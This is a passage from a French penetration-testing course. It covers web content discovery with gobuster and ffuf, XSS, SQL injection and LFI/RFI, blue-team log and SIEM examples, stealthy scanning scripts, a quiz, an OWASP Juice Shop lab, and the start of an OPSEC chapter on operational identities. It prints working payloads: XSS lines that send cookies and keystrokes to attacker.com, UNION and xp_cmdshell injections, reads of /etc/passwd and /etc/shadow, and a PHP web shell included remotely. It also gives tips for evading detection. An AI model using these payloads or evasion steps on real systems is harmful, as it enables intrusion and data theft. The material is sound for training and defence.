   ```

2. **Modes de fonctionnement**
   - **dir** : Découverte de répertoires/fichiers
   - **dns** : Énumération de sous-domaines
   - **vhost** : Énumération de virtual hosts

3. **Découverte de répertoires/fichiers**
   ```bash
   # Scan simple
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt
   
   # Recherche d'extensions spécifiques
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
   
   # Affichage des codes de statut spécifiques
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -s 200,301,302
   ```

4. **Options avancées**
   ```bash
   # Définition d'un agent utilisateur
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -a "Mozilla/5.0"
   
   # Authentification HTTP Basic
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -U admin -P password
   
   # Nombre de threads
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt -t 50
   
   # Délai entre les requêtes (ms)
   gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt --delay 500ms
   ```

5. **Énumération de sous-domaines**
   ```bash
   gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   ```

6. **Énumération de virtual hosts**
   ```bash
   gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   ```

#### ffuf (Fuzz Faster U Fool)

ffuf est un outil de fuzzing web rapide et flexible, particulièrement utile pour la découverte de contenu et le fuzzing de paramètres.

1. **Installation**
   ```bash
   # Préinstallé sur Kali Linux récent
   which ffuf
   
   # Ou installation manuelle
   sudo apt install -y ffuf
   ```

2. **Découverte de contenu**
   ```bash
   # Scan simple
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
   
   # Recherche d'extensions spécifiques
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html
   
   # Filtrage par code de statut
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
   ```

3. **Fuzzing de paramètres**
   ```bash
   # Fuzzing de paramètres GET
   ffuf -u "http://example.com/index.php?FUZZ=value" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt
   
   # Fuzzing de valeurs de paramètres
   ffuf -u "http://example.com/index.php?id=FUZZ" -w /usr/share/wordlists/SecLists/Fuzzing/numbers.txt
   ```

4. **Options avancées**
   ```bash
   # Définition d'un agent utilisateur
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "User-Agent: Mozilla/5.0"
   
   # Authentification HTTP Basic
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
   
   # Nombre de threads
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50
   
   # Délai entre les requêtes (ms)
   ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -p 0.5
   ```

5. **Fuzzing multiple**
   ```bash
   # Fuzzing de plusieurs positions
   ffuf -u "http://example.com/FUZZ1/FUZZ2" -w /usr/share/wordlists/dirb/common.txt:FUZZ1 -w /usr/share/wordlists/dirb/small.txt:FUZZ2
   ```

#### Considérations OPSEC pour la découverte de contenu

1. **Limitation de la vitesse**
   ```bash
   # dirb avec délai
   dirb http://example.com -z 1000  # 1 seconde entre les requêtes
   
   # gobuster avec délai
   gobuster dir -u http://example.com -w wordlist.txt --delay 1s
   
   # ffuf avec délai
   ffuf -u http://example.com/FUZZ -w wordlist.txt -p 1.0
   ```

2. **Limitation du bruit**
   ```bash
   # Réduction du nombre de requêtes
   # Utilisez des wordlists plus petites et ciblées
   
   # Filtrage des résultats pour réduire les faux positifs
   ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 12345  # Filtre par taille
   ```

3. **Masquage de l'origine**
   ```bash
   # Modification de l'User-Agent
   dirb http://example.com -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
   
   # Utilisation d'un proxy
   gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080
   ```

### Vulnérabilités web courantes : XSS, SQLi, LFI/RFI

#### Cross-Site Scripting (XSS)

Le XSS permet à un attaquant d'injecter du code JavaScript malveillant qui s'exécute dans le navigateur de la victime.

1. **Types de XSS**
   - **Reflected XSS** : Le script injecté est renvoyé immédiatement par le serveur
   - **Stored XSS** : Le script injecté est stocké sur le serveur et exécuté ultérieurement
   - **DOM-based XSS** : Le script injecté est exécuté via la manipulation du DOM

2. **Détection de XSS**
   ```bash
   # Test de base
   <script>alert('XSS')</script>
   
   # Contournement de filtres
   <img src="x" onerror="alert('XSS')">
   <body onload="alert('XSS')">
   <svg onload="alert('XSS')">
   javascript:alert('XSS')
   ```

3. **Exploitation de XSS**
   ```javascript
   // Vol de cookies
   <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   
   // Capture de frappe
   <script>
   document.addEventListener('keypress', function(e) {
     fetch('https://attacker.com/keys?key='+e.key)
   });
   </script>
   
   // Redirection
   <script>window.location='https://attacker.com'</script>
   ```

4. **Prévention et contournement**
   - Encodage des caractères spéciaux
   - Validation des entrées
   - Content Security Policy (CSP)
   
   ```
   # Contournement d'encodage HTML
   &lt;script&gt;alert(1)&lt;/script&gt;
   
   # Contournement de CSP
   <script src="https://allowed-domain.com/xss.js"></script>
   ```

#### SQL Injection (SQLi)

L'injection SQL permet à un attaquant d'exécuter des requêtes SQL malveillantes sur la base de données.

1. **Types d'injection SQL**
   - **In-band SQLi** : Les résultats sont visibles dans la réponse
   - **Blind SQLi** : Les résultats ne sont pas visibles directement
   - **Error-based SQLi** : Exploitation des messages d'erreur
   - **Time-based SQLi** : Exploitation des délais de réponse

2. **Détection de SQLi**
   ```
   # Caractères de test
   '
   "
   #
   ;
   -- 
   
   # Tests de base
   ' OR '1'='1
   " OR "1"="1
   1' OR '1'='1
   admin'--
   ```

3. **Exploitation de SQLi**
   ```sql
   -- Extraction de données
   ' UNION SELECT 1,2,3,4,5--
   ' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--
   ' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'--
   ' UNION SELECT username,password,3,4,5 FROM users--
   
   -- Blind SQLi
   ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
   ' AND IF((SELECT username FROM users WHERE id=1)='admin',sleep(5),0)--
   
   -- Exécution de commandes (si possible)
   '; EXEC xp_cmdshell 'ping 10.0.0.1'--  -- SQL Server
   '; SELECT sys_exec('cat /etc/passwd')--  -- PostgreSQL
   ```

4. **Automatisation avec SQLmap**
   ```bash
   # Test de base
   sqlmap -u "http://example.com/page.php?id=1"
   
   # Test avec authentification
   sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=1234"
   
   # Extraction de données
   sqlmap -u "http://example.com/page.php?id=1" --dbs  # Bases de données
   sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables  # Tables
   sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --columns  # Colonnes
   sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users -C username,password --dump  # Données
   ```

#### Local File Inclusion (LFI) et Remote File Inclusion (RFI)

Les vulnérabilités LFI et RFI permettent à un attaquant d'inclure des fichiers locaux ou distants dans l'application web.

1. **Local File Inclusion (LFI)**
   ```
   # Tests de base
   http://example.com/page.php?file=../../../etc/passwd
   http://example.com/page.php?file=../../../windows/win.ini
   
   # Contournement de filtres
   http://example.com/page.php?file=....//....//....//etc/passwd
   http://example.com/page.php?file=../../../etc/passwd%00  # Null byte (PHP < 5.3.4)
   http://example.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
   ```

2. **Remote File Inclusion (RFI)**
   ```
   # Tests de base
   http://example.com/page.php?file=http://attacker.com/malicious.php
   http://example.com/page.php?file=\\attacker.com\shared\malicious.php
   
   # Contournement de filtres
   http://example.com/page.php?file=http://attacker.com/malicious.txt?
   http://example.com/page.php?file=http:%252f%252fattacker.com/malicious.php
   ```

3. **Exploitation de LFI/RFI**
   ```
   # Lecture de fichiers sensibles
   http://example.com/page.php?file=../../../etc/passwd
   http://example.com/page.php?file=../../../etc/shadow
   http://example.com/page.php?file=../../../var/www/html/config.php
   
   # Exécution de code via LFI
   http://example.com/page.php?file=../../../proc/self/environ  # Si User-Agent est inclus
   http://example.com/page.php?file=../../../var/log/apache2/access.log  # Log poisoning
   
   # Exécution de code via RFI
   # Créez un fichier malicious.php sur votre serveur
   <?php system($_GET['cmd']); ?>
   
   # Incluez-le via RFI
   http://example.com/page.php?file=http://attacker.com/malicious.php&cmd=id
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les activités web

1. **Logs de serveur web**
   - Requêtes HTTP dans les logs d'accès
   - Erreurs dans les logs d'erreur
   
   **Exemple de log Apache :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0200] "GET /index.php?id=1' HTTP/1.1" 500 1234 "-" "Mozilla/5.0"
   ```
   
   **Exemple de log Nginx :**
   ```
   192.168.1.100 - - [15/May/2023:14:23:45 +0200] "GET /index.php?id=1' HTTP/1.1" 500 1234 "http://example.com" "Mozilla/5.0"
   ```

2. **Logs d'application**
   - Erreurs SQL dans les logs d'application
   - Exceptions dans les logs d'application
   
   **Exemple de log d'erreur PHP :**
   ```
   [15-May-2023 14:23:45] PHP Warning: mysqli_query(): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1 in /var/www/html/index.php on line 42
   ```

3. **Logs de base de données**
   - Requêtes SQL dans les logs de requête
   - Erreurs dans les logs d'erreur
   
   **Exemple de log MySQL :**
   ```
   2023-05-15T14:23:45.123456Z 42 [Warning] Aborted connection 42 to db: 'database' user: 'user' host: 'localhost' (Got an error reading communication packets)
   ```

#### Détection par les systèmes de sécurité

1. **Web Application Firewall (WAF)**
   - Détection de signatures d'attaque
   - Blocage de requêtes malveillantes
   
   **Exemple de log ModSecurity :**
   ```
   [15/May/2023:14:23:45 +0200] [example.com/sid#7f8a4b2e0700][rid#7f8a4c4a90a0][/index.php][1] SQL Injection Attack Detected via libinjection [file "/etc/modsecurity/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "65"] [id "942100"] [rev "1"] [msg "SQL Injection Attack Detected via libinjection"] [data "Matched data: sqli pattern found in ARGS:id: 1'"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.0"] [maturity "1"] [accuracy "8"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"] [hostname "example.com"] [uri "/index.php"] [unique_id "YKUZwcCoAMcAAHT7A50AAAAB"]
   ```

2. **IDS/IPS**
   - Détection de signatures d'attaque web
   - Détection d'anomalies dans le trafic HTTP
   
   **Exemple d'alerte Snort :**
   ```
   [**] [1:1000001:1] SQL Injection Attempt [**]
   [Classification: Web Application Attack] [Priority: 1]
   05/15-14:23:45.123456 192.168.1.100:45678 -> 192.168.1.200:80
   TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:1234
   ***AP*** Seq: 0x12345678 Ack: 0x87654321 Win: 0x1000 TcpLen: 20
   [Xref => http://example.com/sql_injection]
   ```

3. **SIEM**
   - Corrélation d'événements web
   - Détection de patterns d'attaque
   
   **Exemple d'alerte SIEM :**
   ```
   [ALERT] Web Attack Detected
   Source IP: 192.168.1.100
   Target: http://example.com/index.php
   Time: 2023-05-15 14:23:45
   Details: Multiple SQL injection attempts detected
   Severity: High
   ```

#### Alertes SIEM typiques

**Alerte de scan de contenu :**
```
[ALERT] Web Content Scanning Detected
Source IP: 192.168.1.100
Target: http://example.com
Time: 2023-05-15 14:23:45
Details: Multiple 404 responses to sequential requests
Severity: Medium
```

**Alerte d'injection SQL :**
```
[ALERT] SQL Injection Attack Detected
Source IP: 192.168.1.100
Target: http://example.com/index.php
Time: 2023-05-15 14:30:12
Details: SQL syntax error in application logs correlated with suspicious request parameters
Severity: High
```

**Alerte de XSS :**
```
[ALERT] Cross-Site Scripting Attack Detected
Source IP: 192.168.1.100
Target: http://example.com/search.php
Time: 2023-05-15 14:35:27
Details: Script tags detected in request parameters
Severity: Medium
```

### Pièges classiques et erreurs à éviter

#### Erreurs techniques

1. **Tests incomplets**
   - Limitation à quelques points d'injection évidents
   - Non-vérification des différents vecteurs d'attaque
   - Oubli des paramètres cachés (cookies, en-têtes)

2. **Interprétation incorrecte**
   - Faux positifs dans les résultats de scan
   - Confusion entre différents types de vulnérabilités
   - Mauvaise compréhension des messages d'erreur

3. **Problèmes de performance**
   - Scans trop agressifs causant des timeouts
   - Surcharge des applications cibles
   - Blocage d'IP par des mécanismes de défense

#### Erreurs OPSEC

1. **Signature évidente**
   - Utilisation d'outils avec des signatures reconnaissables
   - User-Agent par défaut révélant l'outil utilisé
   - Payloads d'attaque standards facilement détectables

2. **Comportement prévisible**
   - Scan séquentiel des ressources
   - Timing régulier entre les requêtes
   - Progression logique des phases de test

3. **Bruit excessif**
   - Génération d'erreurs multiples et visibles
   - Scan simultané de nombreuses ressources
   - Exécution de payloads destructifs ou bruyants

### OPSEC Tips : tests web discrets

#### Techniques de base

1. **Ralentissement des activités**
   ```bash
   # Ajout de délais entre les requêtes
   gobuster dir -u http://example.com -w wordlist.txt --delay 2s
   
   # Limitation du nombre de threads
   ffuf -u http://example.com/FUZZ -w wordlist.txt -t 1
   ```

2. **Limitation de la portée**
   ```bash
   # Tests ciblés plutôt qu'exhaustifs
   # Au lieu de scanner tous les chemins possibles, cibler ceux probables
   gobuster dir -u http://example.com -w custom_small_wordlist.txt
   ```

3. **Utilisation de techniques passives**
   ```bash
   # Analyse des réponses plutôt que tests actifs
   curl -s http://example.com | grep -i "version"
   ```

#### Techniques avancées

1. **Modification des signatures**
   ```bash
   # Modification du User-Agent
   curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" http://example.com
   
   # Utilisation de Burp Suite avec User-Agent personnalisé
   # Configurer dans Proxy > Options > Match and Replace
   ```

2. **Personnalisation des payloads**
   ```
   # Au lieu de payloads standards
   ' OR '1'='1
   
   # Utiliser des payloads personnalisés moins détectables
   ' OR 'a'='a
   ' OR 2>1--
   ```

3. **Distribution temporelle**
   ```bash
   # Script pour répartir les tests dans le temps
   #!/bin/bash
   urls=("index.php" "admin.php" "login.php" "config.php")
   for url in "${urls[@]}"; do
       curl -s "http://example.com/$url"
       sleep $((RANDOM % 300 + 60))  # Pause de 1-5 minutes
   done
   ```

#### Script de test web OPSEC

Voici un exemple de script pour réaliser des tests web discrets :

```bash
#!/bin/bash
# stealth_web_test.sh - Tests web discrets avec techniques OPSEC

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target_url> [output_dir]"
    exit 1
fi

TARGET=$1
OUTPUT_DIR=${2:-"stealth_web_$(date +%Y%m%d_%H%M%S)"}

mkdir -p "$OUTPUT_DIR"
echo "[+] Démarrage des tests web discrets sur $TARGET"
echo "[+] Les résultats seront enregistrés dans $OUTPUT_DIR"

# User-Agents aléatoires
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
)

# Fonction pour obtenir un User-Agent aléatoire
random_ua() {
    echo ${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
}

# Fonction pour exécuter une commande avec délai aléatoire
run_cmd() {
    local cmd=$1
    local outfile=$2
    local min_delay=$3
    local max_delay=$4
    
    echo "[*] Exécution de: $cmd"
    eval "$cmd" > "$OUTPUT_DIR/$outfile" 2>&1
    echo "[+] Résultats enregistrés dans $OUTPUT_DIR/$outfile"
    
    # Délai aléatoire
    local delay=$((RANDOM % (max_delay - min_delay + 1) + min_delay))
    echo "[*] Pause de $delay secondes..."
    sleep $delay
}

# Phase 1: Reconnaissance passive
echo "[*] Phase 1: Reconnaissance passive..."
run_cmd "curl -s -A \"$(random_ua)\" $TARGET" "01_homepage.html" 10 30

# Extraction des liens et ressources
run_cmd "grep -o 'href=\"[^\"]*\"' \"$OUTPUT_DIR/01_homepage.html\" | cut -d '\"' -f 2 | sort -u" "02_links.txt" 5 15
run_cmd "grep -o 'src=\"[^\"]*\"' \"$OUTPUT_DIR/01_homepage.html\" | cut -d '\"' -f 2 | sort -u" "03_resources.txt" 5 15

# Phase 2: Découverte de contenu discrète
echo "[*] Phase 2: Découverte de contenu discrète..."

# Création d'une wordlist personnalisée basée sur le contenu
cat "$OUTPUT_DIR/02_links.txt" "$OUTPUT_DIR/03_resources.txt" | grep -o '[^/]*$' | sort -u > "$OUTPUT_DIR/custom_wordlist.txt"

# Ajout de quelques mots courants
echo -e "admin\nlogin\nconfig\nbackup\nwp-admin\nphpmyadmin\ntest" >> "$OUTPUT_DIR/custom_wordlist.txt"

# Découverte de contenu avec délais
run_cmd "gobuster dir -u $TARGET -w \"$OUTPUT_DIR/custom_wordlist.txt\" -a \"$(random_ua)\" -t 1 --delay 3s" "04_content_discovery.txt" 30 60

# Phase 3: Tests de vulnérabilités discrets
echo "[*] Phase 3: Tests de vulnérabilités discrets..."

# Extraction des formulaires
run_cmd "grep -A 5 '<form' \"$OUTPUT_DIR/01_homepage.html\"" "05_forms.txt" 5 15

# Extraction des paramètres d'URL
run_cmd "grep -o 'href=\"[^\"]*?[^\"]*\"' \"$OUTPUT_DIR/01_homepage.html\" | cut -d '\"' -f 2 | sort -u" "06_url_params.txt" 5 15

# Tests de vulnérabilités sur les paramètres trouvés
if [ -s "$OUTPUT_DIR/06_url_params.txt" ]; then
    echo "[*] Test discret des paramètres URL..."
    while read -r url; do
        # Extraction du paramètre
        param=$(echo "$url" | grep -o '[^?&]*=[^&]*' | cut -d '=' -f 1)
        if [ -n "$param" ]; then
            # Test SQLi discret
            run_cmd "curl -s -A \"$(random_ua)\" \"$TARGET/$url'\" | grep -i 'sql\|error\|syntax\|exception'" "07_sqli_test_${param}.txt" 30 90
            
            # Test XSS discret
            run_cmd "curl -s -A \"$(random_ua)\" \"$TARGET/$url<script>\" | grep -i '<script>'" "08_xss_test_${param}.txt" 30 90
            
            # Test LFI discret
            run_cmd "curl -s -A \"$(random_ua)\" \"$TARGET/$url../../../etc/passwd\" | grep -i 'root:'" "09_lfi_test_${param}.txt" 30 90
        fi
    done < "$OUTPUT_DIR/06_url_params.txt"
fi

# Phase 4: Génération du rapport
echo "[*] Phase 4: Génération du rapport..."
{
    echo "# Rapport de test web discret pour $TARGET"
    echo "Date: $(date)"
    echo
    echo "## Ressources découvertes"
    if [ -s "$OUTPUT_DIR/04_content_discovery.txt" ]; then
        grep "Status:" "$OUTPUT_DIR/04_content_discovery.txt" | grep -v "Status: 404"
    else
        echo "Aucune ressource découverte"
    fi
    echo
    echo "## Paramètres URL identifiés"
    if [ -s "$OUTPUT_DIR/06_url_params.txt" ]; then
        cat "$OUTPUT_DIR/06_url_params.txt"
    else
        echo "Aucun paramètre URL identifié"
    fi
    echo
    echo "## Vulnérabilités potentielles"
    # SQLi
    for file in "$OUTPUT_DIR"/07_sqli_test_*.txt; do
        if [ -s "$file" ]; then
            param=$(basename "$file" | cut -d '_' -f 3 | cut -d '.' -f 1)
            echo "- Possible SQLi dans le paramètre '$param'"
        fi
    done
    # XSS
    for file in "$OUTPUT_DIR"/08_xss_test_*.txt; do
        if [ -s "$file" ]; then
            param=$(basename "$file" | cut -d '_' -f 3 | cut -d '.' -f 1)
            echo "- Possible XSS dans le paramètre '$param'"
        fi
    done
    # LFI
    for file in "$OUTPUT_DIR"/09_lfi_test_*.txt; do
        if [ -s "$file" ]; then
            param=$(basename "$file" | cut -d '_' -f 3 | cut -d '.' -f 1)
            echo "- Possible LFI dans le paramètre '$param'"
        fi
    done
} > "$OUTPUT_DIR/00_rapport_synthese.txt"

echo "[+] Tests web discrets terminés. Rapport disponible dans $OUTPUT_DIR/00_rapport_synthese.txt"
```

### Points clés

- La compréhension du protocole HTTP est fondamentale pour tester efficacement les applications web.
- Burp Suite est l'outil de référence pour l'interception et la manipulation du trafic HTTP/HTTPS.
- Les outils de découverte de contenu comme gobuster, dirb et ffuf permettent d'identifier les ressources cachées.
- Les vulnérabilités web courantes comme XSS, SQLi et LFI/RFI peuvent être exploitées pour compromettre des applications.
- Les activités de test web génèrent des traces détectables par les équipes de sécurité défensive.
- Des techniques OPSEC appropriées permettent de réduire significativement la détectabilité des activités de test web.

### Mini-quiz (3 QCM)

1. **Quelle méthode HTTP est la plus appropriée pour soumettre des données sensibles à un serveur ?**
   - A) GET
   - B) POST
   - C) HEAD
   - D) OPTIONS

   *Réponse : B*

2. **Quelle technique d'énumération web est la plus discrète du point de vue OPSEC ?**
   - A) Scan complet avec gobuster à vitesse maximale
   - B) Utilisation de dirb avec un dictionnaire de 100 000 mots
   - C) Analyse passive des liens sur la page d'accueil, suivie de tests ciblés avec délais
   - D) Scan automatisé avec Nikto

   *Réponse : C*

3. **Quel type d'attaque permet à un attaquant d'exécuter du code JavaScript dans le navigateur d'un autre utilisateur ?**
   - A) SQL Injection
   - B) Cross-Site Scripting (XSS)
   - C) Local File Inclusion (LFI)
   - D) Remote File Inclusion (RFI)

   *Réponse : B*

### Lab/Exercice guidé : Test d'une application OWASP Juice Shop

#### Objectif
Réaliser un test d'intrusion de base sur l'application OWASP Juice Shop en utilisant des techniques OPSEC pour minimiser la détection.

#### Prérequis
- Kali Linux
- Docker (pour déployer OWASP Juice Shop)
- Burp Suite

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/juice_shop
cd ~/pentest_labs/juice_shop

# Déploiement de OWASP Juice Shop avec Docker
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Vérification que l'application est accessible
curl -s http://localhost:3000 | grep -i "title"
```

2. **Configuration de Burp Suite**

```bash
# Lancement de Burp Suite
burpsuite &

# Configuration du proxy
# Dans Burp Suite : Onglet "Proxy" > "Options"
# Vérifiez que le proxy écoute sur 127.0.0.1:8080

# Configuration de Firefox
# Préférences > Général > Paramètres réseau
# Configuration manuelle du proxy : 127.0.0.1:8080
```

3. **Reconnaissance passive**

```bash
# Accès à l'application via Firefox configuré avec Burp
firefox http://localhost:3000

# Exploration manuelle de l'application
# - Parcourez les différentes pages
# - Identifiez les fonctionnalités principales
# - Observez les requêtes dans Burp Suite
```

4. **Analyse des requêtes et réponses**

```bash
# Dans Burp Suite : Onglet "Proxy" > "HTTP History"
# Analysez les requêtes et réponses pour identifier :
# - Les points d'entrée (formulaires, API, etc.)
# - Les mécanismes d'authentification
# - Les cookies et jetons de session
```

5. **Découverte de contenu discrète**

```bash
# Création d'un script de découverte discrète
cat > discover_endpoints.sh << 'EOF'
#!/bin/bash
TARGET="http://localhost:3000"
OUTPUT_FILE="endpoints.txt"

# User-Agent réaliste
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Wordlist personnalisée basée sur le contexte de l'application
cat > wordlist.txt << 'EOL'
api
admin
login
register
products
basket
order
profile
about
contact
faq
search
rest
EOL

# Découverte de contenu avec délais
echo "[+] Démarrage de la découverte de contenu..."
while read -r path; do
    echo "[*] Test de $TARGET/$path"
    code=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" "$TARGET/$path")
    if [ "$code" != "404" ]; then
        echo "$path - $code" >> "$OUTPUT_FILE"
    fi
    sleep $((RANDOM % 5 + 2))  # Délai de 2-6 secondes
done < wordlist.txt

echo "[+] Découverte terminée. Résultats dans $OUTPUT_FILE"
EOF

# Rendre le script exécutable et l'exécuter
chmod +x discover_endpoints.sh
./discover_endpoints.sh
```

6. **Test d'authentification**

```bash
# Création d'un compte
# Accédez à http://localhost:3000/#/register
# Créez un compte avec une adresse email et un mot de passe

# Analyse du processus d'authentification dans Burp Suite
# Observez les requêtes de login et les réponses
```

7. **Test de vulnérabilités XSS**

```bash
# Test de XSS dans la fonction de recherche
# Accédez à http://localhost:3000/#/search
# Testez avec le payload : <script>alert('XSS')</script>

# Test de XSS dans les commentaires de produits
# Sélectionnez un produit et ajoutez un commentaire
# Testez avec le payload : <img src="x" onerror="alert('XSS')">
```

8. **Test d'injection SQL**

```bash
# Test de SQLi dans la fonction de login
# Accédez à http://localhost:3000/#/login
# Testez avec l'email : ' OR 1=1--
# Testez avec le mot de passe : ' OR '1'='1

# Test de SQLi dans la fonction de recherche
# Accédez à http://localhost:3000/#/search
# Testez avec la recherche : ' UNION SELECT null,id,email,password,null,null,null FROM Users--
```

9. **Analyse des résultats**

```bash
# Création d'un rapport de synthèse
cat > rapport.md << 'EOF'
# Rapport de test - OWASP Juice Shop

## Points d'entrée identifiés
- Formulaire de login
- Fonction de recherche
- Commentaires de produits
- API REST

## Vulnérabilités potentielles
- XSS dans la fonction de recherche
- XSS dans les commentaires de produits
- Injection SQL dans la fonction de login

## Recommandations
- Validation et assainissement des entrées utilisateur
- Utilisation de requêtes préparées pour les interactions avec la base de données
- Mise en place d'une Content Security Policy (CSP)
EOF
```

#### Vue Blue Team

Dans un environnement réel, cette approche discrète générerait moins d'alertes qu'une approche standard :

1. **Logs générés**
   - Requêtes HTTP espacées dans le temps
   - User-Agent réaliste
   - Volume de requêtes limité

2. **Alertes potentielles**
   - Détection de payloads XSS et SQLi
   - Mais moins d'alertes liées au volume ou au timing

3. **Contre-mesures possibles**
   - Analyse de contenu des requêtes
   - Détection de patterns d'attaque spécifiques
   - Web Application Firewall (WAF)

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié plusieurs vulnérabilités dans OWASP Juice Shop
- Comprendre comment tester une application web de manière discrète
- Être capable d'analyser les requêtes et réponses HTTP
- Apprécier l'importance des techniques OPSEC dans les tests web
- Avoir produit un rapport de synthèse des vulnérabilités découvertes
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 7 : OPSEC Niveau 1 - Hygiène & traces

### Introduction : Pourquoi ce thème est important

L'OPSEC (Operational Security) est souvent négligée dans les formations de pentesting traditionnelles, qui se concentrent principalement sur les techniques d'exploitation. Pourtant, la capacité à opérer de manière discrète est essentielle pour tout professionnel de la sécurité offensive. Ce chapitre introduit les fondamentaux de l'OPSEC de niveau 1, axés sur l'hygiène numérique et la gestion des traces. Ces compétences sont cruciales non seulement pour éviter la détection lors de tests d'intrusion, mais aussi pour comprendre comment les attaquants réels opèrent et comment les équipes défensives peuvent les détecter. Une bonne OPSEC fait la différence entre un test d'intrusion qui simule fidèlement une menace réelle et un simple exercice technique.

### Gestion des identités et pseudonymes

La gestion de votre identité numérique est la première ligne de défense OPSEC. Une séparation stricte entre vos différentes identités est essentielle pour éviter la corrélation et le traçage.

#### Principes de base de la gestion d'identité

1. **Séparation des identités**
   - Séparez vos identités personnelles, professionnelles et opérationnelles
   - Utilisez des comptes distincts pour chaque contexte
   - Évitez tout chevauchement entre ces identités

2. **Création de pseudonymes**
   - Choisissez des pseudonymes qui ne révèlent pas d'informations personnelles
   - Évitez les références à votre localisation, âge, genre ou intérêts personnels
   - N'utilisez pas de variations de votre nom réel ou de vos autres pseudonymes

3. **Maintien de la séparation**
   - Utilisez des navigateurs différents pour chaque identité
   - Évitez de vous connecter à plusieurs comptes depuis le même appareil
   - Ne mentionnez jamais une identité lorsque vous utilisez une autre

#### Création d'une identité opérationnelle

```bash
# Création d'un compte email dédié aux opérations
# Utilisez un service qui respecte la vie privée comme ProtonMail
firefox https://protonmail.com

# Utilisation de Tor pour l'inscription
torbrowser-launcher

# Génération d'un nom d'utilisateur aléatoire
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1
```

#### Gestion des mots de passe

1. **Utilisation d'un gestionnaire de mots de passe dédié**
   ```bash
   # Installation de KeePassXC
   sudo apt update
   sudo apt install -y keepassxc
   
   # Création d'une base de données chiffrée
   keepassxc &
   # File > New Database
   # Utilisez un mot de passe fort et une clé de fichier
   ```

2. **Génération de mots de passe forts et uniques**
   ```bash
   # Génération via KeePassXC
   # Entry > Add new entry
   # Cliquez sur l'icône de dé pour générer un mot de passe
   
   # Ou génération en ligne de commande
   openssl rand -base64 20
   ```

3. **Rotation régulière des identifiants**
   - Changez vos mots de passe opérationnels tous les 30-90 jours
   - Utilisez des mots de passe différents pour chaque service
   - Documentez de manière sécurisée vos identifiants

#### Protection contre le doxing

Le doxing est la pratique consistant à rechercher et publier des informations privées sur une personne. Pour vous protéger :

1. **Audit de votre présence en ligne**
   ```bash
   # Recherche de votre nom réel
   firefox "https://www.google.com/search?q=%22votre+nom+complet%22"
   
   # Recherche de votre pseudonyme
   firefox "https://www.google.com/search?q=%22votre+pseudonyme%22"
   
   # Recherche d'images
   firefox "https://www.google.com/search?tbm=isch&q=%22votre+nom+complet%22"
   ```

2. **Suppression d'informations sensibles**
   - Contactez les sites web pour demander la suppression de vos données
   - Utilisez votre droit à l'oubli (RGPD en Europe)
